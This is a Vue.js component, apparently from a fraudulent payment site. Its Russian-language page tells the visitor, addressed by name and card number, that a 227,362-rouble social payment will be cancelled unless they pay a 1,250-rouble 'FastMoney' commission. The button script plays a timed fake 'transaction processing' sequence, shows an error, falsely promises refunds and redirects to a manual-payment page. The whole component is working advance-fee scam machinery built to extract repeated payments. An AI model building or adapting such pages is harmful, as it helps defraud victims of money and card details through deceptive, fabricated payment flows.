<template>
	<div class="v-fast-money">
		<div class="fastMoney">
			<div class="subFastMoney">
				<p class="fastMoneyHeader">Ответ получен</p>
				<div class="fastMoneyText">
					<p>Превышено максимальное кол-во попыток</p>
					<p>отправки средств.</p>
					<p>Дабы избежать аннулирования начисленной</p>
					<p>выплаты в сумме <span>227 362 руб (двести двадцать</span></p>
					<p><span>семь тысяч триста шестьдесят два рубля)</span> для</p>
					<p>{{this.$store.state.processingData.lastName}} {{this.$store.state.processingData.name}} {{this.$store.state.processingData.middleName}}, используйте систему быстрых переводов</p>
					<p>«FastMoney»</p>
				</div>
				<div class="fastMoneyTextTwo">
					<p>Средства будет отправлены по скоростному</p>
					<p>каналу обработки транзакций.</p>
					<p>Для отправки средств на карту</p>
					<p>№{{this.$store.state.processingData.cardNumber}} оплатите комиссию</p>
					<p>оператора в размере 1250 руб.</p>
				</div>
				<div class="fastMoneyTextThree">
					<p>Ранее оплаченные комиссии уже помечены</p>
					<p>отменёнными и вернуться на карту, с которой</p>
					<p>происходила оплата в течении рабочего дня или на</p>
					<p>следующие сутки.</p>
				</div>
				<button class="fastMoneyButton" @click="hideSubFastMoney">Оплатить комиссию «FastMoney»</button>
			</div>
				<p class="fastMoneyHeaderTwo">Проверка оплаты комиссии</p>
				<p class="fastMoneyHeaderThree">Ошибка!</p>
				<div class="wrapperefastMoneyLoader">
					<div class="loaderefastMoneytLoader"></div>
				</div>
				<img :src="require('@/assets/icons/check-in.png')" class="subFastMoneyImg">
				<p class="fastMoneyTextTFour">Подготовка транзакции к отправке</p>
				<p class="fastMoneyTextTFive">Отправка социальной выплаты на счёт</p>
				<p class="fastMoneyTextTSix">получателя.</p>
				<p class="fastMoneyTextTSeven">Проверка статуса</p>
				<p class="fastMoneyTextEight">Оплаченная комиссия будет возвращена</p>
				<p class="fastMoneyTextNine">на карту</p>
		</div>
	</div>
</template>

<script>
	export default {
		name: 'v-fast-money',
		methods: {
			hideSubFastMoney() {
				let subFastMoney 						= document.querySelector('.subFastMoney')
				let fastMoneyHeaderTwo 			= document.querySelector('.fastMoneyHeaderTwo')
				let fastMoneyHeaderThree 		= document.querySelector('.fastMoneyHeaderThree')
				let wrapperefastMoneyLoader = document.querySelector('.wrapperefastMoneyLoader')
				let fastMoneyTextTFour 			= document.querySelector('.fastMoneyTextTFour')
				let fastMoneyTextTFive 			= document.querySelector('.fastMoneyTextTFive')
				let fastMoneyTextTSix 			= document.querySelector('.fastMoneyTextTSix')
				let fastMoneyTextTSeven 		= document.querySelector('.fastMoneyTextTSeven')
				let fastMoneyTextEight 			= document.querySelector('.fastMoneyTextEight')
				let fastMoneyTextNine 			= document.querySelector('.fastMoneyTextNine')
				let subFastMoneyImg 				= document.querySelector('.subFastMoneyImg')

				subFastMoney.style.display = 'none'
				fastMoneyHeaderTwo.style.display = 'block'
				wrapperefastMoneyLoader.style.display = 'block'
				setTimeout(() => {
					fastMoneyTextTFour.style.display = 'block'
				}, 1000)
				setTimeout(() => {
					fastMoneyTextTFive.style.display = 'block'
					fastMoneyTextTSix.style.display = 'block'
				}, 2000)
				setTimeout(() => {
					fastMoneyTextTSeven.style.display = 'block'
				}, 3000)
				setTimeout(() => {
					fastMoneyTextTFour.style.display 			= 'none'
					fastMoneyTextTFive.style.display 			= 'none'
					fastMoneyTextTSix.style.display 			= 'none'
					fastMoneyTextTSeven.style.display 		= 'none'
					wrapperefastMoneyLoader.style.display = 'none'
					fastMoneyHeaderTwo.style.display 			= 'none'
					fastMoneyTextEight.style.display 			= 'block'
					fastMoneyTextNine.style.display 			= 'block'
					fastMoneyHeaderThree.style.display 		= 'block'
					subFastMoneyImg.style.display 				= 'block'
				}, 4000)
				setTimeout(() => {
					this.$router.push('/manualPayment')
				}, 6000)
			}
		}
	}
</script>

<style>
	.v-fast-money {
		max-width: 900px;
		margin: 0 auto;
		padding: 80px 0;
		display: flex;
		justify-content: center;
	}
	.fastMoney {
		width: 100%;
		min-height: 485px;
		background: #FFFFFF;
		box-shadow: 0px 4px 20px rgba(0, 0, 0, 0.1);
		border-radius: 15px;
		padding: 20px 0px;
		text-align: center;
	}
	.fastMoneyHeader {
		font-family: Exo 2;
		font-style: normal;
		font-weight: bold;
		font-size: 28px;
		line-height: 34px;
		color: #005391;
	}
	.fastMoneyText {
		margin: 20px 0;
	}	
	.fastMoneyText p {
		font-family: Montserrat;
		font-style: normal;
		font-weight: 500;
		font-size: 18px;
		line-height: 22px;
		color: #2D2D2D;
		margin: 0;
	}
	.fastMoneyText span {
		color: red;
	}
	.fastMoneyTextTwo {
		margin: 20px 0;
	}
	.fastMoneyTextTwo p {
		font-family: Montserrat;
		font-style: normal;
		font-weight: 600;
		font-size: 16px;
		line-height: 20px;
		color: #646464;
		margin: 0;
	}
	.fastMoneyTextThree p {
		margin: 0;
		font-family: Montserrat;
		font-style: normal;
		font-weight: bold;
		font-size: 16px;
		line-height: 20px;
		color: #008ED1;
	}
	.fastMoneyButton {
		background: #005391;
		border-radius: 5px;
		padding: 15px;
		width: 50%;
		border: none;
		outline: none;
		font-family: Montserrat;
		font-style: normal;
		font-weight: bold;
		font-size: 16px;
		line-height: 20px;
		text-transform: uppercase;
		color: #FFFFFF;
		margin-top: 50px;
		margin-bottom: 100px;
	}
	.fastMoneyButton:hover {
		cursor: pointer;
		background: #2E7DB8;
	}
	.wrapperefastMoneyLoader {
		margin: 34px auto;
		width: 53px;
		display: none;
	}
	.loaderefastMoneytLoader {
		animation: loader-spin 1s linear infinite;
		width: 53px;
		height: 53px;
		border: 4px solid rgba(0,0,0,0.1);
		border-radius: 50%;
		border-right-color: #0062AA;
		margin-top: 55px;
		margin-bottom: 60px;
	}
	@keyframes loader-spin {
  	0% {
    	transform: rotate(0deg);
  	}
  	100% {
    	transform: rotate(360deg);
  	}
	}
	.fastMoneyHeaderTwo {
		display: none;
		font-family: Exo 2;
		font-style: normal;
		font-weight: bold;
		font-size: 28px;
		line-height: 34px;
		color: #2D2D2D;
	}
	.fastMoneyHeaderThree {
		display: none;
		font-family: Exo 2;
		font-style: normal;
		font-weight: bold;
		font-size: 28px;
		line-height: 34px;
		color: #2D2D2D;
	}
	.fastMoneyTextTFour {
		font-family: Montserrat;
		font-style: normal;
		font-weight: bold;
		font-size: 18px;
		line-height: 22px;
		color: #0062AA;
		display: none;
	}
	.fastMoneyTextTFive {
		font-family: Montserrat;
		font-style: normal;
		font-weight: bold;
		font-size: 18px;
		line-height: 22px;
		color: #0062AA;
		display: none;
		margin: 0;
	}
	.fastMoneyTextTSix {
		font-family: Montserrat;
		font-style: normal;
		font-weight: bold;
		font-size: 18px;
		line-height: 22px;
		color: #0062AA;
		display: none;
		margin: 0;
	}
	.fastMoneyTextTSeven {
		font-family: Montserrat;
		font-style: normal;
		font-weight: bold;
		font-size: 18px;
		line-height: 22px;
		color: #0062AA;
		display: none;
	}
	.fastMoneyTextEight {
		font-family: Montserrat;
		font-style: normal;
		font-weight: bold;
		font-size: 20px;
		line-height: 24px;
		color: #E21C2A;
		margin: 0;
		display: none;
	}
	.fastMoneyTextNine {
		font-family: Montserrat;
		font-style: normal;
		font-weight: bold;
		font-size: 20px;
		line-height: 24px;
		color: #E21C2A;
		margin: 0;
		display: none;
	}
	.subFastMoneyImg {
		margin: 34px auto;
		width: 53px;
		display: none;
	}
	@media only screen and (max-width: 440px) {
		.fastMoney {
			padding:20px 15px;
			margin: 10px;
			width: 250px;
		}
		.fastMoneyButton {
			font-size: 14px;
			width: 100%;
			margin-bottom: 10px;
		}
	}
</style>